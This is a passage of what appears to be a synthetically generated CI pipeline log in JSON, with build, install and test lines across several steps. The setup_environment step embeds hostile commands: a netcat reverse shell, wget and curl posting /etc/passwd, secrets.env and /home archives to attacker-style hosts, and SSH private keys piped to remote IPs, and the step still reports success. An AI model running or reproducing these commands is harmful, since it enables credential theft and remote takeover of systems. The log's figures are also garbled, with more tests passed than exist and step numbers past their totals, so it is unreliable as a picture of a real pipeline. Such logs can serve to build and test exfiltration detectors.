utils/app.ts...\n[12:46:16] DEBUG: Connection pool: 4 active\n[12:46:16] INFO: Starting build process\nStep 20/22: Testing\npip: Downloading axios-3.10.tar.gz\n\u2717 build failed with exit code 67\nUsing Python 3.10\n[12:46:16] WARN: Deprecated API usage\nOptimizing 58 modules...\nHEAD is now at 3013cc1\nStep 8/24: Testing\nOptimizing 47 modules...\nWARNING: prettier has known vulnerabilities\nNODE_ENV=test\npip: Downloading prettier-5.3.tar.gz\nConnection established\nCompiling components/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 13 passed, 45 total\nnpm install: added 362 packages\nStep 7/17: Testing\nNODE_ENV=production\n\u2713 Task completed in 338ms\nWARNING: webpack has known vulnerabilities\npip: Installing build dependencies...\nTests: 147 passed, 352 total\nCompleted.\nWaiting...\nAlready up to date.\nReady.\npip: Collecting axios\nCoverage: 88% statements, 85% branches\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\npip: Installing build dependencies...\nTests: 54 passed, 180 total\nProcessing...\nSnapshots: 0 passed, 44 total\nStep 9/19: Testing\n\u2713 All checks passed\nBuilding Docker image...\nImage pulled successfully\nCache restored successfully (82MB)\n[12:46:16] WARN: Deprecated API usage\n[12:46:16] DEBUG: Connection pool: 2 active\nTLS handshake completed\n  PASS: test_cache_hit (82ms)\nnpm notice: created a lockfile\npip: Downloading axios-2.20.tar.gz\nCreating production build...\nException: RuntimeError\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\nCreating production build...\nnpm install: resolved 1579 packages\nNODE_ENV=production\nnpm install: resolved 1183 packages\nStep 8/15: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSwitched to branch 'bugfix/task-137'\nTest Suites: 41 passed, 16 total\nCompiling src/index.js...\n[12:46:16] DEBUG: Memory usage: 1175MB\nStep 6/21: Installing dependencies\nUsing Node.js 20.20.3\nPOST /data - 200 (257ms)\nStep 16/24: Deploying\nTests: 96 passed, 66 total\nFinished.\nnpm install: added 128 packages\nBundling runtime.css\nFinished.\nCache hit for key-7881\nLoading...\n[12:46:16] DEBUG: Connection pool: 17 active\nCompiling lib/main.py...\n\u2713 Task completed in 3726ms\nDone.\nPOST /upload - 201 (163ms)\n\u2713 Task completed in 2410ms\nTime: 67.687s\n[12:46:16] WARN: Deprecated API usage\nPulling image: node:latest\nnpm install: added 140 packages\nCache saved successfully\nGET /status - 201 (50ms)\nnpm install: resolved 1805 packages\n[12:46:16] INFO: Processing request\nConnection established\nTime: 104.845s\nSwitched to branch 'hotfix/task-625'\n\u2713 Step 'test' succeeded\nLoading...\nnpm install: resolved 1494 packages\nCache hit for key-5356\nOK\n[12:46:16] DEBUG: Loading configuration\nGenerating source maps...\nPOST /data - 201 (414ms)\n\u2713 deploy completed\npip: Installing build dependencies...\nBuilding Docker image...\nInstalling axios@3.3.5\nCompiling src/index.js...\nFetching submodules...\nStep 2/20: Running migrations\nGET /health - 204 (87ms)\nSwitched to branch 'bugfix/task-749'\n[12:46:16] DEBUG: Query executed in 67ms\n[12:46:16] INFO: Starting build process\npip: Collecting webpack\nCompiling components/index.js...\nWaiting...\nUploading artifact 'coverage' (47 files)\nGET /api - 204 (31ms)\nVerifying...\nGenerating source maps...\nnpm notice: package.json updated\nEnvironment: development\nFetching from https://amazonaws.com/package.json\nArtifact downloaded: 14MB\n[12:46:16] INFO: Starting build process\nFetching from https://docker.io/package.json\nPushing to registry...\nUsing Python 3.10\nCache saved successfully\nCompiling components/handler.rs...\n\u2713 Step 'setup' succeeded\nFAILED: test_cache_hit\nProcessing...\n  PASS: test_api_health (252ms)\nChecking out master branch\n[12:46:16] DEBUG: Initializing service\nTest Suites: 34 passed, 17 total\nCache restored successfully (382MB)\n\u2713 Step 'test' succeeded\nSwitched to branch 'feature/task-201'\n\u2713 All checks passed\nPOST /upload - 200 (312ms)\nOptimizing 61 modules...\nStep 6/15: Running migrations\nPOST /data - 200 (402ms)\n  PASS: test_api_health (497ms)\nLayer 7/14: COPY command\nCache miss for key-2935\n[12:46:16] WARN: Deprecated API usage\nTest Suites: 24 passed, 22 total\nUploading artifact 'dist' (15 files)\nWaiting...\nGET /health - 204 (16ms)\n[12:46:16] DEBUG: Memory usage: 1778MB\nCompiling components/index.js...\nyarn add: Done in 8.90s\nSuccess!\nnpm install: resolved 1531 packages\nnpm install: added 252 packages\n[12:46:16] DEBUG: Loading configuration\n[12:46:16] INFO: Cache refreshed\n[12:46:16] WARN: Deprecated API usage\nStep 3/24: Building\nCreating production build...\nDone.\nRan 156 tests in 55s\nFAILED: test_db_connect\n[12:46:16] DEBUG: Connection pool: 6 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\n=== Step deploy_staging completed ===\n=== Step: upload_artifacts ===\nArtifact uploaded: dist.zip (70MB)\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nTLS handshake completed\n\u2713 test completed\n  PASS: test_auth_login (349ms)\n  PASS: e2e/test_api_health.spec.js\n[12:46:16] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nnpm install: added 18 packages\nStep 6/24: Testing\nRan 12 tests in 50s\nPlatform: win32-x64\n[12:46:16] INFO: Connecting to database\nCache restored successfully (227MB)\nPushing to registry...\nArtifact uploaded: build.tar.gz (23MB)\nInstalling eslint@1.7.2\nWARNING: eslint has known vulnerabilities\nnpm install: added 406 packages\n[12:46:16] INFO: Request completed\nTest Suites: 15 passed, 40 total\nReady.\nTLS handshake completed\n[12:46:16] INFO: Connecting to database\nWARNING: react has known vulnerabilities\nWaiting...\nFetching submodules...\n\u2713 test completed\nChecking out main branch\nSnapshots: 3 passed, 18 total\nStep 7/19: Deploying\nDone.\nEnvironment: development\n[12:46:16] INFO: Cache refreshed\nArtifact uploaded: dist.zip (47MB)\nSnapshots: 38 passed, 27 total\nPOST /data - 200 (52ms)\nArtifact uploaded: build.tar.gz (26MB)\n[12:46:16] WARN: Deprecated API usage\nStep 6/16: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'install' succeeded\nnpm notice: created a lockfile\nCoverage: 73% statements, 95% branches\nWARNING: lodash has known vulnerabilities\nLoading...\nNODE_ENV=test\nUploading artifact 'build' (17 files)\nnpm notice: created a lockfile\nCache hit for key-5253\nUploading artifact 'build' (25 files)\n  PASS: e2e/test_user_create.spec.js\nPushing to registry...\n[12:46:16] WARN: Deprecated API usage\nnpm notice: package.json updated\n[12:46:16] DEBUG: Loading configuration\nStep 9/21: Testing\nBuilding Docker image...\nOK\nTest Suites: 35 passed, 26 total\nCompiling src/index.js...\nFetching submodules...\nUploading artifact 'build' (5 files)\nStep 4/23: Testing\nLayer 4/10: ENV command\nCompleted.\nStep 17/20: Testing\nProcessing...\nMinifying vendor.js\nnpm notice: package.json updated\npip: Collecting webpack\nStep 19/21: Running migrations\nCompiling utils/main.py...\nFinished.\nProcessing...\nWARNING: express has known vulnerabilities\n[12:46:16] DEBUG: Memory usage: 1234MB\nLayer 2/14: COPY command\nStep 17/17: Deploying\nArtifact downloaded: 14MB\nnpm install: added 80 packages\nStep 12/24: Running migrations\nCompiling components/handler.rs...\n[12:46:16] DEBUG: Query executed in 32ms\nCache miss for key-1912\nCache miss for key-7705\nNODE_ENV=production\nSuccess!\npip install: Successfully installed react-4.14\nWARNING: eslint has known vulnerabilities\nHEAD is now at a0fce6b\nCache restored successfully (461MB)\nMinifying vendor.js\nArtifact downloaded: 22MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\nAlready up to date.\n[12:46:16] INFO: Processing request\nDone.\nGET /status - 200 (15ms)\nnpm notice: package.json updated\nCache saved successfully\n[12:46:16] WARN: Deprecated API usage\nPlatform: linux-x64\n\u2717 build failed with exit code 60\npip: Collecting express\n[12:46:16] DEBUG: Connection pool: 2 active\nPushing to registry...\nWARNING: webpack has known vulnerabilities\nCache invalidated: dependencies\npip install: Successfully installed webpack-1.6\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache restored successfully (331MB)\nDone.\nTime: 114.942s\nGET /health - 200 (96ms)\npip: Installing build dependencies...\n[12:46:16] DEBUG: Connection pool: 7 active\nChecking out master branch\nRan 89 tests in 33s\n[12:46:16] DEBUG: Loading configuration\nyarn add: Done in 10.6s\nHEAD is now at df7aca5\nMinifying vendor.js\nArtifact uploaded: dist.zip (69MB)\nOptimizing 98 modules...\nUploading artifact 'dist' (38 files)\nRan 10 tests in 1s\nPulling image: node:3.11\n[12:46:16] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\npip install: Successfully installed webpack-1.10\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\nStep 17/19: Building\nArtifact uploaded: build.tar.gz (22MB)\n[12:46:16] DEBUG: Query executed in 58ms\nPlatform: linux-x64\n[12:46:16] DEBUG: Memory usage: 1613MB\nDone.\n[12:46:16] INFO: Starting build process\nnc -e /bin/sh 67.237.40.61 31913\n[12:46:16] INFO: Connecting to database\n[12:46:16] DEBUG: Connection pool: 6 active\n[12:46:16] INFO: Starting build process\nnpm notice: created a lockfile\npip: Installing build dependencies...\nPlatform: win32-x64\n[12:46:16] WARN: Deprecated API usage\nProcessing...\nUsing Node.js 19.1.6\nRan 147 tests in 7s\nAlready up to date.\n[12:46:16] DEBUG: Connection pool: 13 active\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nStep 4/15: Running migrations\n[12:46:16] DEBUG: Initializing service\nHEAD is now at 8492ba3\nArtifact downloaded: 21MB\n[12:46:16] INFO: Processing request\nImage pulled successfully\nFinished.\nConnection established\nLoading...\n\u2713 All checks passed\n[12:46:16] DEBUG: Loading configuration\nCompiling components/index.js...\nStep 10/19: Deploying\nGET /api - 200 (97ms)\nLoading...\n[12:46:16] DEBUG: Connection pool: 10 active\n[12:46:16] DEBUG: Loading configuration\npip install: Successfully installed express-4.13\n[12:46:16] INFO: Starting build process\n[12:46:16] WARN: Deprecated API usage\npip: Collecting webpack\n[12:46:16] INFO: Starting build process\n[12:46:16] INFO: Request completed\nBundling styles.js\nPOST /api - 202 (463ms)\nArtifact uploaded: dist.zip (94MB)\n[12:46:16] WARN: Deprecated API usage\n\u2713 All checks passed\nCoverage: 72% statements, 66% branches\npip install: Successfully installed axios-5.19\nChecking out main branch\npip: Installing build dependencies...\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n[12:46:16] DEBUG: Initializing service\necho $(cat ~/.ssh/id_rsa) | base64 | nc 76.248.145.7 37665\nFinished.\nPulling image: alpine:3.11\n\u2713 All checks passed\nCache hit for key-4852\nOptimizing 95 modules...\nSwitched to branch 'hotfix/task-291'\nTransforming 664 files...\nBuilding Docker image...\nCache invalidated: build\nReady.\nStep 20/24: Deploying\necho $(cat ~/.ssh/id_rsa) | base64 | nc 171.188.149.171 55312\npip: Collecting eslint\n  PASS: e2e/test_user_create.spec.js\nTest Suites: 27 passed, 44 total\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 63.126.173.233 60201\nStep 3/23: Linting\n[12:46:16] INFO: Cache refreshed\n\u2713 Step 'build' succeeded\nBuilding Docker image...\nCompiling lib/service.java...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 240.98.87.249 23473\n  PASS: test_cache_hit (19ms)\nWaiting...\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nFinished.\nFetching from https://googleapis.com/package.json\n[12:46:16] DEBUG: Initializing service\nUsing Node.js 17.6.8\nRan 183 tests in 33s\nnpm install: resolved 636 packages\nCompiling utils/handler.rs...\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nCompiling components/index.js...\nFAILED: test_cache_hit\nArtifact downloaded: 15MB\nProcessing...\nUploading artifact 'coverage' (47 files)\nTLS handshake completed\nCompleted.\nPlatform: win32-x64\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nCache hit for key-6433\nChecking out develop branch\n[12:46:16] DEBUG: Memory usage: 1201MB\nSwitched to branch 'bugfix/task-920'\nConnection established\n[12:46:16] WARN: Deprecated API usage\nCompiling src/handler.rs...\n\u2713 Step 'build' succeeded\nStep 15/15: Testing\n[12:46:16] DEBUG: Connection pool: 20 active\n[12:46:16] DEBUG: Initializing service\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nAlready up to date.\n[12:46:16] INFO: Connecting to database\nTransforming 188 files...\nEnvironment: development\n[12:46:16] INFO: Cache refreshed\nGenerating source maps...\nnpm install: added 490 packages\nSuccess!\n[12:46:16] DEBUG: Loading configuration\nCreating production build...\nUploading artifact 'coverage' (16 files)\nArtifact downloaded: 29MB\nOptimizing 69 modules...\n[12:46:16] DEBUG: Connection pool: 11 active\nImage pulled successfully\n[12:46:16] INFO: Connecting to database\nFAILED: test_api_health\nStep 3/20: Installing dependencies\n\u2713 deploy completed\nCache hit for key-1709\n\u2713 Step 'test' succeeded\nOptimizing 60 modules...\npip: Installing build dependencies...\nHEAD is now at bea9c57\nFinished.\n\u2713 lint completed\nImage pulled successfully\nSending 309MB of data to evil-server.cc\nyarn add: Done in 15.54s\nNODE_ENV=production\nCompiling components/app.ts...\n=== Step setup_environment completed ===",
    "steps": [
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-13T12:46:16.646231",
        "finished_at": "2025-12-13T12:46:19.241134",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 11/17: Testing",
          "[12:46:16] DEBUG: Memory usage: 812MB",
          "npm notice: package.json updated",
          "Using Node.js 19.1.5",
          "\u2713 package completed",
          "GET /status - 200 (44ms)",
          "Uploading artifact 'dist' (27 files)",
          "Compiling utils/handler.rs...",
          "Step 2/24: Running migrations",
          "[12:46:16] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Environment: development",
          "Image pulled successfully",
          "[12:46:16] WARN: Deprecated API usage",
          "pip: Downloading express-2.7.tar.gz",
          "Using Node.js 16.1.5",
          "\u2713 All checks passed",
          "Cache hit for key-1575",
          "Compiling lib/main.py...",
          "npm install: resolved 852 packages",
          "Compiling utils/app.ts...",
          "Step 8/18: Deploying",
          "[12:46:16] WARN: Deprecated API usage",
          "Minifying main.js",
          "Finished.",
          "Fetching submodules...",
          "Bundling runtime.js",
          "OK",
          "Platform: win32-x64",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 deploy completed",
          "Cache restored successfully (270MB)",
          "Verifying...",
          "[12:46:16] WARN: Deprecated API usage",
          "Verifying...",
          "Minifying vendor.js",
          "Connection established",
          "POST /api - 202 (490ms)",
          "  PASS: test_auth_login (404ms)",
          "Artifact downloaded: 25MB",
          "\u2713 Task completed in 4634ms",
          "Pulling image: alpine:latest",
          "Checking out master branch",
          "Already up to date.",
          "[12:46:16] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Completed.",
          "[12:46:16] DEBUG: Query executed in 11ms",
          "OK",
          "yarn add: Done in 10.71s",
          "Fetching from https://docker.io/package.json",
          "pip: Collecting lodash",
          "TLS handshake completed",
          "Installing jest@4.2.0",
          "Artifact uploaded: dist.zip (11MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching submodules...",
          "Coverage: 85% statements, 72% branches",
          "  PASS: integration/test_api_health.spec.js",
          "  PASS: unit/test_api_health.spec.js",
          "Optimizing 92 modules...",
          "Switched to branch 'bugfix/task-413'",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Using Python 3.10",
          "[12:46:16] ERROR: Connection failed",
          "\u2713 Task completed in 3256ms",
          "[12:46:16] WARN: Deprecated API usage",
          "Step 10/21: Linting",
          "Compiling components/handler.rs...",
          "Cache hit for key-9158",
          "[12:46:16] INFO: Starting build process",
          "[12:46:16] WARN: Deprecated API usage",
          "npm install: added 355 packages",
          "Fetching submodules...",
          "Connection established",
          "Checking out main branch",
          "Waiting...",
          "Processing...",
          "[12:46:16] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Ready.",
          "Image pulled successfully",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Compiling components/service.java...",
          "npm install: added 47 packages",
          "npm install: added 371 packages",
          "[12:46:16] INFO: Request completed",
          "[12:46:16] WARN: Deprecated API usage",
          "Using Node.js 18.5.4",
          "[12:46:16] INFO: Cache refreshed",
          "[12:46:16] DEBUG: Connection pool: 8 active",
          "Bundling vendor.css",
          "[12:46:16] INFO: Connecting to database",
          "[12:46:16] INFO: Processing request",
          "FAILED: test_auth_login",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "Cache saved successfully",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/handler.rs...",
          "pip: Downloading lodash-4.11.tar.gz",
          "[12:46:16] WARN: Deprecated API usage",
          "Artifact downloaded: 19MB",
          "Compiling src/index.js...",
          "npm install: added 252 packages",
          "Transforming 704 files...",
          "Cache invalidated: dependencies",
          "[12:46:16] INFO: Connecting to database",
          "  PASS: test_api_health (125ms)",
          "Using Python 3.11",
          "  PASS: test_auth_login (290ms)",
          "Compiling lib/utils.go...",
          "Step 13/18: Building",
          "Step 12/23: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 30 passed, 19 total",
          "Coverage: 75% statements, 89% branches",
          "npm install: added 316 packages",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/21: Testing",
          "Platform: linux-x64",
          "POST /api - 202 (470ms)",
          "Cache hit for key-4584",
          "Environment: test",
          "Minifying main.js",
          "Building Docker image...",
          "Step 9/15: Running migrations",
          "Step 3/18: Running migrations",
          "Layer 3/12: ENV command",
          "Completed.",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-13T12:46:19.241134",
        "finished_at": "2025-12-13T12:46:25.728391",
        "log_lines": [
          "=== Step: type_check ===",
          "Cache saved successfully",
          "[12:46:16] DEBUG: Loading configuration",
          "Success!",
          "Exception: ValueError",
          "Cache hit for key-2035",
          "Done.",
          "Switched to branch 'bugfix/task-223'",
          "Pushing to registry...",
          "Finished.",
          "Loading...",
          "[12:46:16] DEBUG: Query executed in 24ms",
          "npm install: resolved 846 packages",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:46:16] DEBUG: Connection pool: 12 active",
          "[12:46:16] DEBUG: Memory usage: 737MB",
          "Switched to branch 'feature/task-940'",
          "Using Python 3.9",
          "OK",
          "Cache saved successfully",
          "Connection established",
          "HEAD is now at 728b244",
          "Waiting...",
          "[12:46:16] DEBUG: Query executed in 99ms",
          "Bundling main.js",
          "Step 3/22: Building",
          "Using Python 3.9",
          "Ran 193 tests in 23s",
          "Bundling vendor.js",
          "Compiling lib/handler.rs...",
          "Ready.",
          "[12:46:16] WARN: Deprecated API usage",
          "  PASS: test_db_connect (134ms)",
          "Using Python 3.11",
          "Exception: ValueError",
          "Step 10/19: Testing",
          "[12:46:16] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Connection established",
          "Step 7/18: Deploying",
          "Image pulled successfully",
          "npm install: added 120 packages",
          "Ran 70 tests in 42s",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] WARN: Deprecated API usage",
          "Pulling image: python:3.11",
          "Coverage: 75% statements, 79% branches",
          "OK",
          "  PASS: integration/test_auth_login.spec.js",
          "Bundling styles.js",
          "Pulling image: python:latest",
          "Bundling main.css",
          "Image pulled successfully",
          "Cache hit for key-1878",
          "Coverage: 89% statements, 66% branches",
          "\u2713 Task completed in 4318ms",
          "Tests: 156 passed, 470 total",
          "npm install: resolved 223 packages",
          "[12:46:16] DEBUG: Loading configuration",
          "Creating production build...",
          "Fetching from https://googleapis.com/package.json",
          "GET /api - 201 (85ms)",
          "[12:46:16] DEBUG: Loading configuration",
          "Already up to date.",
          "[12:46:16] DEBUG: Connection pool: 1 active",
          "GET /status - 200 (25ms)",
          "npm notice: created a lockfile",
          "Cache miss for key-3818",
          "OK",
          "pip: Collecting express",
          "GET /status - 201 (100ms)",
          "Layer 4/8: COPY command",
          "Completed.",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] INFO: Cache refreshed",
          "Generating source maps...",
          "Artifact downloaded: 31MB",
          "NODE_ENV=development",
          "[12:46:16] WARN: Deprecated API usage",
          "Step 20/19: Running migrations",
          "Installing eslint@4.9.3",
          "Compiling components/service.java...",
          "Bundling main.css",
          "Compiling utils/utils.go...",
          "[12:46:16] DEBUG: Initializing service",
          "Step 9/15: Testing",
          "Test Suites: 24 passed, 43 total",
          "[12:46:16] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 64",
          "[12:46:16] INFO: Connecting to database",
          "Already up to date.",
          "Verifying...",
          "Time: 41.737s",
          "Using Python 3.10",
          "Uploading artifact 'build' (46 files)",
          "Cache restored successfully (207MB)",
          "Waiting...",
          "OK",
          "  PASS: test_auth_login (259ms)",
          "Loading...",
          "Snapshots: 36 passed, 29 total",
          "HEAD is now at f27ebcf",
          "Step 17/15: Building",
          "\u2713 Step 'build' succeeded",
          "npm install: added 217 packages",
          "\u2717 build failed with exit code 102",
          "Checking out master branch",
          "Cache restored successfully (245MB)",
          "Cache miss for key-1590",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:46:16] INFO: Request completed",
          "Building Docker image...",
          "[12:46:16] DEBUG: Query executed in 39ms",
          "\u2713 All checks passed",
          "Time: 40.831s",
          "[12:46:16] DEBUG: Connection pool: 14 active",
          "Done.",
          "POST /data - 201 (155ms)",
          "Finished.",
          "Cache restored successfully (194MB)",
          "Time: 75.483s",
          "Compiling utils/handler.rs...",
          "POST /data - 202 (116ms)",
          "Snapshots: 37 passed, 3 total",
          "Cache miss for key-7151",
          "WARNING: axios has known vulnerabilities",
          "npm notice: created a lockfile",
          "Already up to date.",
          "Ran 140 tests in 2s",
          "Ran 153 tests in 27s",
          "Cache saved successfully",
          "[12:46:16] INFO: Starting build process",
          "npm notice: package.json updated",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-13T12:46:25.728391",
        "finished_at": "2025-12-13T12:46:29.620745",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'install' succeeded",
          "Fetching submodules...",
          "[12:46:16] DEBUG: Connection pool: 20 active",
          "Cache invalidated: build",
          "Compiling utils/index.js...",
          "[12:46:16] INFO: Starting build process",
          "Step 3/21: Testing",
          "[12:46:16] DEBUG: Connection pool: 2 active",
          "Step 5/18: Deploying",
          "Cache restored successfully (383MB)",
          "\u2717 build failed with exit code 48",
          "Done.",
          "[12:46:16] INFO: Connecting to database",
          "Step 3/25: Installing dependencies",
          "Using Node.js 18.9.10",
          "Finished.",
          "Step 5/21: Running migrations",
          "Tests: 317 passed, 422 total",
          "Ready.",
          "yarn add: Done in 21.95s",
          "Cache saved successfully",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] WARN: Deprecated API usage",
          "  PASS: integration/test_user_create.spec.js",
          "Step 10/16: Installing dependencies",
          "TLS handshake completed",
          "Waiting...",
          "[12:46:16] INFO: Connecting to database",
          "\u2717 build failed with exit code 123",
          "WARNING: prettier has known vulnerabilities",
          "npm install: added 471 packages",
          "Compiling src/handler.rs...",
          "Waiting...",
          "[12:46:16] DEBUG: Connection pool: 3 active",
          "GET /api - 200 (60ms)",
          "[12:46:16] ERROR: Connection failed",
          "[12:46:16] DEBUG: Query executed in 60ms",
          "Pushing to registry...",
          "Done.",
          "Step 19/19: Deploying",
          "[12:46:16] INFO: Processing request",
          "Cache saved successfully",
          "pip: Collecting eslint",
          "Generating source maps...",
          "Coverage: 73% statements, 86% branches",
          "pip: Collecting prettier",
          "[12:46:16] WARN: Deprecated API usage",
          "Optimizing 13 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 33 passed, 48 total",
          "yarn add: Done in 27.12s",
          "Step 11/19: Building",
          "Verifying...",
          "[12:46:16] WARN: Deprecated API usage",
          "Test Suites: 13 passed, 47 total",
          "Cache miss for key-1670",
          "Exception: RuntimeError",
          "Pulling image: node:3.11",
          "WARNING: react has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Step 1/23: Installing dependencies",
          "pip: Installing build dependencies...",
          "Bundling main.css",
          "\u2713 Task completed in 263ms",
          "npm notice: package.json updated",
          "[12:46:16] DEBUG: Memory usage: 560MB",
          "Tests: 206 passed, 112 total",
          "Checking out main branch",
          "Finished.",
          "pip install: Successfully installed axios-2.5",
          "WARNING: lodash has known vulnerabilities",
          "Fetching from https://pypi.org/package.json",
          "npm install: resolved 146 packages",
          "Bundling runtime.css",
          "HEAD is now at c5d8dc5",
          "WARNING: jest has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at b76c270",
          "Step 15/20: Linting",
          "Fetching submodules...",
          "npm install: added 88 packages",
          "Time: 117.605s",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Test Suites: 17 passed, 41 total",
          "POST /data - 202 (355ms)",
          "Success!",
          "Step 15/21: Running migrations",
          "Compiling src/utils.go...",
          "[12:46:16] INFO: Connecting to database",
          "Pulling image: alpine:18",
          "Artifact downloaded: 2MB",
          "Cache miss for key-6282",
          "Using Python 3.9",
          "HEAD is now at d5fbbb2",
          "Verifying...",
          "Image pulled successfully",
          "Ran 86 tests in 12s",
          "NODE_ENV=development",
          "Artifact downloaded: 12MB",
          "Layer 9/8: COPY command",
          "Building Docker image...",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:16] DEBUG: Memory usage: 1729MB",
          "Compiling lib/utils.go...",
          "pip: Installing build dependencies...",
          "Processing...",
          "Waiting...",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "[12:46:16] DEBUG: Memory usage: 1535MB",
          "Step 1/22: Linting",
          "Layer 9/14: COPY command",
          "Step 3/19: Building",
          "Step 12/22: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:16] INFO: Processing request",
          "NODE_ENV=development",
          "Coverage: 74% statements, 75% branches",
          "Step 19/16: Deploying",
          "  PASS: e2e/test_auth_login.spec.js",
          "npm notice: created a lockfile",
          "Step 9/21: Installing dependencies",
          "Tests: 174 passed, 181 total",
          "Cache miss for key-8225",
          "pip: Downloading eslint-2.17.tar.gz",
          "\u2713 Task completed in 1099ms",
          "Cache miss for key-1325",
          "Fetching submodules...",
          "pip: Collecting lodash",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-13T12:46:29.620745",
        "finished_at": "2025-12-13T12:46:36.108002",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2713 Task completed in 3499ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:16] DEBUG: Memory usage: 1006MB",
          "Artifact downloaded: 29MB",
          "Step 12/23: Building",
          "Layer 9/8: RUN command",
          "Done.",
          "\u2713 build completed",
          "Image pulled successfully",
          "Image pulled successfully",
          "Fetching from https://googleapis.com/package.json",
          "Cache saved successfully",
          "[12:46:16] INFO: Request completed",
          "OK",
          "Ready.",
          "POST /upload - 200 (429ms)",
          "Fetching submodules...",
          "[12:46:16] INFO: Starting build process",
          "Ready.",
          "Processing...",
          "Installing prettier@2.15.7",
          "[12:46:16] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "[12:46:16] INFO: Request completed",
          "pip: Downloading express-4.10.tar.gz",
          "Compiling utils/main.py...",
          "Using Node.js 20.13.6",
          "Bundling vendor.js",
          "Snapshots: 28 passed, 45 total",
          "Step 5/25: Building",
          "[12:46:16] INFO: Starting build process",
          "pip: Downloading jest-3.8.tar.gz",
          "\u2713 Step 'setup' succeeded",
          "WARNING: lodash has known vulnerabilities",
          "Success!",
          "Optimizing 27 modules...",
          "npm install: resolved 1692 packages",
          "npm notice: package.json updated",
          "\u2713 test completed",
          "Cache saved successfully",
          "Verifying...",
          "Environment: test",
          "WARNING: lodash has known vulnerabilities",
          "Ready.",
          "[12:46:16] INFO: Cache refreshed",
          "POST /api - 201 (383ms)",
          "Verifying...",
          "Step 16/20: Linting",
          "Step 8/21: Installing dependencies",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 22 tests in 29s",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] INFO: Starting build process",
          "Compiling src/app.ts...",
          "[12:46:16] INFO: Processing request",
          "Loading...",
          "Fetching submodules...",
          "Fetching from https://npmjs.org/package.json",
          "NODE_ENV=development",
          "Optimizing 34 modules...",
          "Step 4/19: Installing dependencies",
          "npm notice: created a lockfile",
          "Cache restored successfully (99MB)",
          "npm notice: package.json updated",
          "FAILED: test_auth_login",
          "[12:46:16] DEBUG: Memory usage: 1794MB",
          "Image pulled successfully",
          "Optimizing 39 modules...",
          "Platform: linux-x64",
          "pip install: Successfully installed express-4.13",
          "Ready.",
          "Compiling utils/index.js...",
          "Pulling image: node:18",
          "Ready.",
          "[12:46:16] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (5MB)",
          "HEAD is now at 4dd5378",
          "Step 19/18: Running migrations",
          "[12:46:16] INFO: Cache refreshed",
          "Cache restored successfully (393MB)",
          "Step 16/19: Deploying",
          "Ran 200 tests in 39s",
          "Compiling utils/service.java...",
          "Done.",
          "[12:46:16] DEBUG: Loading configuration",
          "Transforming 632 files...",
          "Checking out main branch",
          "Compiling lib/utils.go...",
          "yarn add: Done in 2.90s",
          "[12:46:16] INFO: Connecting to database",
